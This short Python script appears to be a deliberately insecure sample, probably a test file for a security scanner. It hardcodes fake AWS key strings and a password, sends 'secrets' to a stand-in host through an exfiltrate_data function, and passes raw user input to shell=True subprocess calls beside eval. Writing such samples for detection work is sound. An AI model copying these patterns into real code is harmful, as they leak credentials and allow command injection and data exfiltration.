import os
import subprocess
from urllib import request, parse

AWS_Secret_1 = "AKIA1234ABCD5678EFGH"
AWS_Secret_2 = "AKIAIOSFODNN7EXAMPLE"
AWS_Secret_3 = "AKIA9EXAMPLE12345678"

AWS_SECRET_ACCESS_KEY = "AKIA1234567890TESTKEY"

def login(username):
    password = "SuperSecret123!"
    if username == "admin" and password == "SuperSecret123!":
        print("Login successful")
    else:
        print("Access denied")

def exfiltrate_data():
    data = parse.urlencode({"secrets": "top_secret_data"}).encode()
    req = request.Request("http://test.com/upload", data=data)
    response = request.urlopen(req)
    print("Data exfiltrated:", response.getcode())
    
def bad():
    subprocess.call("ls", shell=True)

user_input = input("Command: ")
subprocess.call(user_input, shell=True)

eval("print('danger')")

subprocess.call(input("cmd:"), shell=True)

eval("print('this is dangerous')")

def main():
    login("admin")
    exfiltrate_data()
    bad()

if __name__ == "__main__":
    main()

